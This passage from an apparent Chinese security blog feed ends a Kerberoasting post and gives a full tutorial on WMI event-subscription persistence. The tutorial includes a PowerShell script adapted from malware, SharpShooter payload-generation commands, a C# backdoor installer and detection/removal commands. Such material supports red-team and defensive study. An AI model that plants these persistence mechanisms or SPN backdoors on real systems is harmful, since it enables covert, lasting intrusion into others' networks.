class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tgsrepcrack.py(kerberoast套装)</span><br><span class="line"><span class="function"><span class="title">hashcat</span><span class="params">(密码破解全能工具，kali自带)</span></span></span><br></pre></td></tr></table></figure></p><p><img src="/image/【域渗透】SPN 扫描利用/Snipaste_2019-06-10_15-35-24.png" alt="Snipaste_2019-06-10_15-35-24"></p><p><img src="/image/【域渗透】SPN 扫描利用/Snipaste_2019-06-10_15-46-01.png" alt="Snipaste_2019-06-10_15-46-01"></p><h2 id="0x07-Kerberoasting-的后门利用"><a href="#0x07-Kerberoasting-的后门利用" class="headerlink" title="0x07 Kerberoasting 的后门利用"></a>0x07 <code>Kerberoasting</code> 的后门利用</h2><p>在我们取得了 SPN 的修改权限后，可以为指定的域用户添加一个 SPN，这样可以随时获得该域用户的 TGS ，经过破解后获得明文口令。</p><h2 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h2><p><a href="https://docs.microsoft.com/zh-cn/sql/reporting-services/report-server/register-a-service-principal-name-spn-for-a-report-server?view=sql-server-2017" target="_blank" rel="noopener">为报表服务器注册服务主体名称 (SPN)</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken.-ctor?view=netframework-4.8" target="_blank" rel="noopener">KerberosRequestorSecurityToken(String)</a><br><a href="https://www.anquanke.com/post/id/161781#h3-8" target="_blank" rel="noopener">从 Kekeo 到 Rubeus</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/" target="_blank" rel="noopener">域渗透——Kerberoasting</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;Kerberos&lt;/code&gt; 与 &lt;code&gt;SPN&lt;/code&gt;。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>【权限维持】WMIC 事件订阅</title>
    <link href="https://rcoil.me/2019/05/%E3%80%90%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E3%80%91WMIC%20%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/"/>
    <id>https://rcoil.me/2019/05/【权限维持】WMIC 事件订阅/</id>
    <published>2019-05-30T12:52:59.000Z</published>
    <updated>2019-10-31T15:27:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文是针对<a href="https://github.com/RcoIl/Mind-Map/blob/master/Windows%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6.png" target="_blank" rel="noopener">Windows常见持久控制</a>的第三次说明。</p><p>与之前的文章不同，这个操作需要管理员权限。</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在日常中，使用 <code>WMI</code> 都是用于信息的收集，如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe list <span class="comment">#获取补丁信息</span></span><br><span class="line">wmic startup list brief <span class="comment"># 启动的程序</span></span><br><span class="line">wmic startup list full <span class="comment"># 自启动的程序</span></span><br><span class="line">wmic process <span class="keyword">call</span> <span class="keyword">create</span> <span class="string">"calc.exe"</span> <span class="comment"># 在当前机器中执行指定程序</span></span><br><span class="line">wmic process <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'*.exe'</span> <span class="keyword">list</span> <span class="keyword">full</span>   <span class="comment">#查询某个进程所对应某个具体的可执行程序是什么</span></span><br><span class="line">wmic process <span class="keyword">where</span>(description=<span class="string">"rundll32.exe"</span>) <span class="comment"># 查看rundll32所加载的dll</span></span><br><span class="line">wmic cpu <span class="keyword">get</span> DataWidth /<span class="keyword">format</span>:<span class="keyword">list</span> <span class="comment"># 查询当前机器的操作系统位数</span></span><br><span class="line">wmic <span class="keyword">share</span>  <span class="keyword">get</span> <span class="keyword">name</span>,<span class="keyword">path</span>,<span class="keyword">status</span>  <span class="comment">#利用wmic查找共享</span></span><br><span class="line">wmic logicaldisk <span class="keyword">where</span> drivetype=<span class="number">3</span> <span class="keyword">get</span> <span class="keyword">name</span>,freespace,systemname,filesystem,volumeserialnumber,<span class="keyword">size</span> <span class="comment">#查看分区</span></span><br></pre></td></tr></table></figure><p>但其实它的功能还有很多，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">防病毒检测</span><br><span class="line">代码执行</span><br><span class="line">横向移动</span><br><span class="line">持久化</span><br><span class="line">盗取数据</span><br></pre></td></tr></table></figure><p>这里就针对持久化进行说明 。</p><h2 id="0x01-查询-WMI"><a href="#0x01-查询-WMI" class="headerlink" title="0x01 查询 WMI"></a>0x01 查询 WMI</h2><p><code>WMI</code> 提供了一种非常直观的语法用来查询WMI对象的实例，类和命名空间，即 <code>WQL</code> （类似 SQL的查询语言）。WQL查询通常可以分为以下几类：</p><ul><li>Instance Queries（实例查询）：查询WMI对象实例。</li><li>Event Queries（事件查询）：等同于在WMI对象创建/修改/删除的时候注册一个消息。</li><li>Meta Queries（元查询）：元查询用来获取WMI命名空间和类结构的元信息。</li></ul><h3 id="1-1-Instance-Queries"><a href="#1-1-Instance-Queries" class="headerlink" title="1.1 Instance Queries"></a>1.1 Instance Queries</h3><p>这是最常用的WQL查询。基本的格式如下：<br><code>SELECT [Class property name | *] FROM [CLASS NAME] &lt;WHERE [CONSTRAINT]&gt;</code></p><ul><li>下面的查询语句将返回所有可执行文件名中带有 <code>chrome</code> 的正在运行的进程：<br><code>SELECT * FROM Win32_Process WHERE Name LIKE &quot;%chrome%&quot;</code></li></ul><h3 id="1-2-Event-Queries"><a href="#1-2-Event-Queries" class="headerlink" title="1.2 Event Queries"></a>1.2 Event Queries</h3><p>事件查询被用作一种消息机制来监听事件类的触发。通常用来在一个WMI对象实例创建/修改/删除的时候给用户发送一个消息。根据消息类型是 <code>intrinsic</code>（系统自带的）还是 <code>extrinsic</code>（第三方的），查询语句格式不同：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">Class</span> property <span class="keyword">name</span> | *] <span class="keyword">FROM</span> [INTRINSIC <span class="keyword">CLASS</span> <span class="keyword">NAME</span>] <span class="keyword">WITHIN</span> [POLLING <span class="built_in">INTERVAL</span>] &lt;<span class="keyword">WHERE</span> [<span class="keyword">CONSTRAINT</span>]&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">Class</span> property <span class="keyword">name</span> | *] <span class="keyword">FROM</span> [EXTRINSIC <span class="keyword">CLASS</span> <span class="keyword">NAME</span>] &lt;<span class="keyword">WHERE</span> [<span class="keyword">CONSTRAINT</span>]&gt;</span><br></pre></td></tr></table></figure><ul><li><p>用于登陆时都会触发此事件：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> __InstanceCreationEvent <span class="keyword">WITHIN</span> <span class="number">15</span> <span class="keyword">WHERE</span> TargetInstanceISA <span class="string">'Win32_LogonSession'</span> <span class="keyword">AND</span> TargetInstance.LogonType=<span class="number">2</span></span><br></pre></td></tr></table></figure></li><li><p>每次用户在插入可移除设备时都会触发此事件：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Win32_VolumeChangeEvent <span class="keyword">Where</span> EventType=<span class="number">2</span></span><br></pre></td></tr></table></figure></li><li><p>每次创建 win32 进程时都会触发此事件：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">From</span> __InstanceCreationEvent <span class="keyword">Where</span> TargetInstance Isa <span class="string">"Win32_Process"</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="1-3-Meta-Queries"><a href="#1-3-Meta-Queries" class="headerlink" title="1.3 Meta Queries"></a>1.3 Meta Queries</h3><p>元查询用来查询WMI命名空间和类结构的信息。最常见的用法是用来列举WMI命名空间的类结构。元查询是实例查询的一个子集，但是与对象查询不同的是，我们查询的是类的实例的定义。</p><ul><li><p>格式如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">Class</span> property <span class="keyword">name</span> | *] <span class="keyword">FROM</span> [Meta_Class | <span class="keyword">SYSTEM</span> <span class="keyword">CLASS</span> <span class="keyword">NAME</span>] &lt;<span class="keyword">WHERE</span> [<span class="keyword">CONSTRAINT</span>]&gt;</span><br></pre></td></tr></table></figure></li><li><p>下面这个语句会查询所有以 <code>WIN32</code> 开头的WMI的类：<br><code>SELECT * FROM Meta_Class WHERE __CLASS LIKE &quot;Win32%&quot;</code></p></li><li>下面这个语句会查询某个命名空间下的所有命名空间：<br><code>SELECT Name FROM __NAMESPACE</code></li></ul><p>注意，当不显示的指定命名空间时，默认的命名空间为<code>ROOT\CIMV2</code>。</p><h2 id="0x02-与WMI交互"><a href="#0x02-与WMI交互" class="headerlink" title="0x02 与WMI交互"></a>0x02 与WMI交互</h2><p>Microsoft和一些第三方软件开发者为我们提供了许多能够与WMI交互的工具。</p><p>下面是部分工具的一个不完全的列表</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、PowerShell</span><br><span class="line">2、wmic.exe</span><br><span class="line">3、wbemtest.exe</span><br><span class="line">4、WMI Explorer</span><br><span class="line">5、CIM Studio</span><br><span class="line">6、Windows<span class="built_in"> Script </span>Host (WSH) languages</span><br><span class="line">7、C/C++ via IWbem* COM API</span><br><span class="line">8、.NET using System.Management classes</span><br><span class="line">9、winrm.exe</span><br></pre></td></tr></table></figure><h2 id="0x03-WMI事件"><a href="#0x03-WMI事件" class="headerlink" title="0x03 WMI事件"></a>0x03 WMI事件</h2><p>WMI事件分两类，包括<code>本地事件</code>（运行在本地上下文环境当中的单个进程的事件）和<code>永久性WMI事件订阅</code>。</p><p>本地事件有生命周期为进程宿主的周期，而永久性 WMI事件 是存储在WMI库中，以 SYSTEM 权限运行，并且重启后依然存在。</p><h3 id="3-1-前置条件"><a href="#3-1-前置条件" class="headerlink" title="3.1 前置条件"></a>3.1 前置条件</h3><p>为了能够安装一个<code>永久性的 WMI 事件订阅</code>，必须满足两个条件：</p><ul><li>一个 <code>__EventFilter</code> 查询，它创建一个过滤器，为我们的特定事件选择触发器;</li><li><a href="https://docs.microsoft.com/en-gb/windows/desktop/WmiSdk/standard-consumer-classes" target="_blank" rel="noopener">Event Consumer Class</a>，代表一个事件触发时所执行的操作。</li></ul><p>在 <code>Event Consumers</code>（事件处理）中，可用的标准事件处理类：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LogFileEventConsumer： 将事件数据写入到指定的日志文件</span><br><span class="line">ActiveScriptEventConsumer： 用来执行VBScript/JScript程序</span><br><span class="line">NTEventLogEventConsumer：创建一个包含事件数据的日志入口点</span><br><span class="line">SMTPEventConsumer：将事件数据用邮件发送</span><br><span class="line">CommandLineEventConsumer：执行一条命令</span><br></pre></td></tr></table></figure></p><p>利用点</p><ul><li><code>ActiveScriptEventConsumer</code>，允许执行任意脚本（支持 <code>JScript</code> 和 <code>VBScript</code> 引擎）</li><li><code>CommandLineEventConsumer</code>，允许执行任意命令</li></ul><h3 id="3-2-测试"><a href="#3-2-测试" class="headerlink" title="3.2 测试"></a>3.2 测试</h3><p>使用以下查询进行测试：</p><p><code>Select * From __InstanceCreationEvent Where TargetInstance Isa &quot;Win32_Process&quot;</code></p><p>为了方便测试，此处使用 <code>Powershell 的 Register-WMIEvent</code> 安装触发器。</p><p><img src="/image/【权限维持】WMIC 事件订阅/blog_2019-05-30_11-42-33.png" alt="blog_2019-05-30_11-42-33"></p><p>以上测试不符合实际需求。</p><h3 id="3-3-Powershell-实例（命令执行）"><a href="#3-3-Powershell-实例（命令执行）" class="headerlink" title="3.3 Powershell 实例（命令执行）"></a>3.3 Powershell 实例（命令执行）</h3><p>下面的 <code>PowerShell</code> 代码来自一个叫 <code>SEADADDY</code> 的恶意软件的修改版，用来通过<code>WMI做持久化</code>的</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$EventFilterName</span> = <span class="string">'BotFilter11'</span></span><br><span class="line"><span class="variable">$EventConsumerName</span> = <span class="string">'BotConsumer22'</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$EventFilterArgs</span> = @&#123;</span><br><span class="line">EventNamespace = <span class="string">'root\cimv2'</span></span><br><span class="line">Name = <span class="variable">$EventFilterName</span></span><br><span class="line">Query = <span class="string">'Select * From __InstanceCreationEvent Where TargetInstance Isa "Win32_Process"'</span></span><br><span class="line">QueryLanguage=<span class="string">"WQL"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$WMIEventFilter</span> = <span class="built_in">Set-WmiInstance</span> -NameSpace <span class="string">'root\subscription'</span> -Class __EventFilter -Arguments <span class="variable">$EventFilterArgs</span> -ErrorAction Stop</span><br><span class="line"></span><br><span class="line"><span class="variable">$CommandLineumerArgs</span> =@&#123;</span><br><span class="line">        Name=<span class="variable">$EventConsumerName</span></span><br><span class="line">CommandLineTemplate=<span class="string">'C:\Windows\System32\calc.exe'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$WMIEventConsumer</span> = <span class="built_in">Set-WmiInstance</span> -Namespace <span class="string">'root\subscription'</span> -Class CommandLineEventConsumer -Arguments <span class="variable">$CommandLineumerArgs</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$WMIEventFilterToConsumerArgs</span> = @&#123;</span><br><span class="line"><span class="keyword">Filter</span>=<span class="variable">$WMIEventFilter</span></span><br><span class="line">Consumer=<span class="variable">$WMIEventConsumer</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-WmiInstance</span> -Namespace <span class="string">'root\subscription'</span> -Class __FilterToConsumerBinding -Arguments <span class="variable">$WMIEventFilterToConsumerArgs</span></span><br></pre></td></tr></table></figure><p>但是这里实测失败，就算使用<code>C#</code>去添加 <code>CommandLineEventConsumer</code> 也是失败的，但是 <code>LogFileEventConsumer</code> 可成功。</p><h3 id="3-4-C-实例（代码执行）"><a href="#3-4-C-实例（代码执行）" class="headerlink" title="3.4 C# 实例（代码执行）"></a>3.4 C# 实例（代码执行）</h3><p>本示例执行的是 <code>VBScript</code></p><p>使用<code>SharpShooter</code>生成 <code>VBSceipt</code> 类型的 <code>payload</code>。<em>友情提示：一定要生成 64位的 payload。</em></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; python SharpShooter.py --stageless --dotnetver <span class="number">2</span> --payload vbs --output implantvbs --rawscfile payload64.bin</span><br><span class="line"></span><br><span class="line">       _____ __                    _____ __                __           </span><br><span class="line">      <span class="regexp">/ ___/</span><span class="regexp">/ /</span>_  ____ __________ <span class="regexp">/ ___/</span><span class="regexp">/ /</span>_  ____  ____  <span class="regexp">/ /</span>____  _____</span><br><span class="line">      \__ \<span class="regexp">/ __ \/</span> __ `<span class="regexp">/ ___/</span> __ \__ \<span class="regexp">/ __ \/</span> __ \<span class="regexp">/ __ \/</span> __<span class="regexp">/ _ \/</span> ___/</span><br><span class="line">     ___<span class="regexp">/ /</span> <span class="regexp">/ /</span> <span class="regexp">/ /</span>_<span class="regexp">/ /</span> <span class="regexp">/  /</span> <span class="regexp">/_/</span> <span class="regexp">/__/</span> <span class="regexp">/ /</span> <span class="regexp">/ /</span> <span class="regexp">/_/</span> <span class="regexp">/ /</span>_<span class="regexp">/ /</span> <span class="regexp">/_/</span>  __<span class="regexp">/ /</span>    </span><br><span class="line">    <span class="regexp">/____/</span>_<span class="regexp">/ /</span>_<span class="regexp">/\__,_/</span>_<span class="regexp">/  /</span> .___<span class="regexp">/____/</span>_<span class="regexp">/ /</span>_<span class="regexp">/\____/\_</span>___<span class="regexp">/\__/\_</span>__<span class="regexp">/_/</span>     </span><br><span class="line">                         <span class="regexp">/_/</span>                                            </span><br><span class="line"></span><br><span class="line">     Dominic Chell, <span class="meta">@domchell</span>, MDSec ActiveBreach, v2<span class="number">.0</span></span><br><span class="line">    </span><br><span class="line">[*] Written delivery payload to output/implantvbs.vbs</span><br><span class="line">运行vbs，成功上线，再进行 base64 编码</span><br><span class="line">&gt; base64 -i output/implantvbs.vbs &gt;&gt;implantvbs-base64.txt</span><br></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">// WMI Event Subscription Peristence Demo</span><br><span class="line">// Author: @domchell</span><br><span class="line"></span><br><span class="line">using System;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Management;</span><br><span class="line"></span><br><span class="line">namespace WMIPersistence</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            PersistWMI();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        static void PersistWMI()</span><br><span class="line">        &#123;</span><br><span class="line">            ManagementObject myEventFilter = null;</span><br><span class="line">            ManagementObject myEventConsumer = null;</span><br><span class="line">            ManagementObject myBinder = null;</span><br><span class="line"></span><br><span class="line">            string vbscript64 = &quot;&lt;INSIDE base64 encoded VBS here&gt;&quot;;</span><br><span class="line">            string vbscript = Encoding.UTF8.GetString(Convert.FromBase64String(vbscript64));</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                ManagementScope scope = new ManagementScope(@&quot;\\.\root\subscription&quot;);</span><br><span class="line"></span><br><span class="line">                ManagementClass wmiEventFilter = new ManagementClass(scope, new</span><br><span class="line">                ManagementPath(&quot;__EventFilter&quot;), null);</span><br><span class="line">                String strQuery = @&quot;SELECT * FROM __InstanceCreationEvent WITHIN 5 &quot; +            </span><br><span class="line">        &quot;WHERE TargetInstance ISA \&quot;Win32_Process\&quot; &quot; +           </span><br><span class="line">        &quot;AND TargetInstance.Name = \&quot;notepad.exe\&quot;&quot;;</span><br><span class="line"></span><br><span class="line">                WqlEventQuery myEventQuery = new WqlEventQuery(strQuery);</span><br><span class="line">                myEventFilter = wmiEventFilter.CreateInstance();</span><br><span class="line">                myEventFilter[&quot;Name&quot;] = &quot;demoEventFilter&quot;;</span><br><span class="line">                myEventFilter[&quot;Query&quot;] = myEventQuery.QueryString;</span><br><span class="line">                myEventFilter[&quot;QueryLanguage&quot;] = myEventQuery.QueryLanguage;</span><br><span class="line">                myEventFilter[&quot;EventNameSpace&quot;] = @&quot;\root\cimv2&quot;;</span><br><span class="line">                myEventFilter.Put();</span><br><span class="line">                Console.WriteLine(&quot;[*] Event filter created.&quot;);</span><br><span class="line"></span><br><span class="line">                myEventConsumer =</span><br><span class="line">                new ManagementClass(scope, new ManagementPath(&quot;ActiveScriptEventConsumer&quot;),</span><br><span class="line">                null).CreateInstance();</span><br><span class="line">                myEventConsumer[&quot;Name&quot;] = &quot;BadActiveScriptEventConsumer&quot;;</span><br><span class="line">                myEventConsumer[&quot;ScriptingEngine&quot;] = &quot;VBScript&quot;;</span><br><span class="line">                myEventConsumer[&quot;ScriptText&quot;] = vbscript;</span><br><span class="line">                myEventConsumer.Put();</span><br><span class="line"></span><br><span class="line">                Console.WriteLine(&quot;[*] Event consumer created.&quot;);</span><br><span class="line"></span><br><span class="line">                myBinder =</span><br><span class="line">                new ManagementClass(scope, new ManagementPath(&quot;__FilterToConsumerBinding&quot;),</span><br><span class="line">                null).CreateInstance();</span><br><span class="line">                myBinder[&quot;Filter&quot;] = myEventFilter.Path.RelativePath;</span><br><span class="line">                myBinder[&quot;Consumer&quot;] = myEventConsumer.Path.RelativePath;</span><br><span class="line">                myBinder.Put();</span><br><span class="line"></span><br><span class="line">                Console.WriteLine(&quot;[*] Subscription created&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(e);</span><br><span class="line">            &#125; // END CATCH</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125; // END FUNC</span><br><span class="line">    &#125; // END CLASS</span><br><span class="line">&#125; // END NAMESPACE</span><br></pre></td></tr></table></figure><p>管理员权限运行生成的exe，<strong>演示 GIF</strong></p><p><img src="/image/【权限维持】WMIC 事件订阅/blog_2019-05-29_11-42-33.gif" alt="blog_2019-05-29_11-42-33"></p><h2 id="0x04-WMI后门检测及清除"><a href="#0x04-WMI后门检测及清除" class="headerlink" title="0x04 WMI后门检测及清除"></a>0x04 WMI后门检测及清除</h2><h3 id="4-1-Sysmon日志"><a href="#4-1-Sysmon日志" class="headerlink" title="4.1 Sysmon日志"></a>4.1 Sysmon日志</h3><p>略….</p><h3 id="4-2-查看当前WMI-Event"><a href="#4-2-查看当前WMI-Event" class="headerlink" title="4.2 查看当前WMI Event"></a>4.2 查看当前WMI Event</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#List Event Filters</span></span><br><span class="line"><span class="keyword">Get</span>-WMIObject -<span class="keyword">Namespace</span> root\Subscription -<span class="keyword">Class</span> __EventFilter</span><br><span class="line"></span><br><span class="line"><span class="meta">#List Event Consumers</span></span><br><span class="line"><span class="keyword">Get</span>-WMIObject -<span class="keyword">Namespace</span> root\Subscription -<span class="keyword">Class</span> __EventConsumer</span><br><span class="line"></span><br><span class="line"><span class="meta">#List Event Bindings</span></span><br><span class="line"><span class="keyword">Get</span>-WMIObject -<span class="keyword">Namespace</span> root\Subscription -<span class="keyword">Class</span> __FilterToConsumerBinding</span><br></pre></td></tr></table></figure><h3 id="4-3-清除后门"><a href="#4-3-清除后门" class="headerlink" title="4.3 清除后门"></a>4.3 清除后门</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#Filter</span></span><br><span class="line"><span class="keyword">Get</span>-WMIObject -<span class="keyword">Namespace</span> root\Subscription -<span class="keyword">Class</span> __EventFilter -Filter <span class="string">"Name='BotFilter82'"</span> | Remove-WmiObject -Verbose</span><br><span class="line"></span><br><span class="line"><span class="meta">#Consumer</span></span><br><span class="line"><span class="keyword">Get</span>-WMIObject -<span class="keyword">Namespace</span> root\Subscription -<span class="keyword">Class</span> CommandLineEventConsumer -Filter <span class="string">"Name='BotConsumer23'"</span> | Remove-WmiObject -Verbose</span><br><span class="line"></span><br><span class="line"><span class="meta">#Binding</span></span><br><span class="line"><span class="keyword">Get</span>-WMIObject -<span class="keyword">Namespace</span> root\Subscription -<span class="keyword">Class</span> __FilterToConsumerBinding -Filter <span class="string">"__Path LIKE '%BotFilter82%'"</span> | Remove-WmiObject -Verbose</span><br></pre></td></tr></table></figure><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-3-wmi-event-subscription/" target="_blank" rel="noopener">Persistence: “the continued or prolonged existence of something”: Part 3 – WMI Event Subscription</a><br><a href="https://wooyun.x10sec.org/static/drops/tips-8189.html" target="_blank" rel="noopener">WMI Attacks</a><br><a href="https://4hou.win/wordpress/?p=17080" target="_blank" rel="noopener">利用WMI构建无文件后门（基础篇）</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文是针对&lt;a href=&quot;https://github.com/RcoIl/Mind-Map/blob/master/Windows%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6.png&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Windows常见持久控制&lt;/a&gt;的第三次说明。&lt;/p&gt;
&lt;p&gt;与之前的文章不同，这个操作需要管理员权限。&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="权限维持" scheme="https://rcoil.me/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>【权限维持】Microsoft Office</title>
    <link href="https://rcoil.me/2019/05/%E3%80%90%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E3%80%91Microsoft%20Office/"/>
    <id>https://rcoil.me/2019/05/【权限维持】Microsoft Office/</id>
    <published>2019-05-29T10:52:59.000Z</published>
    <updated>2019-10-31T15:26:54.000Z</updated>
    
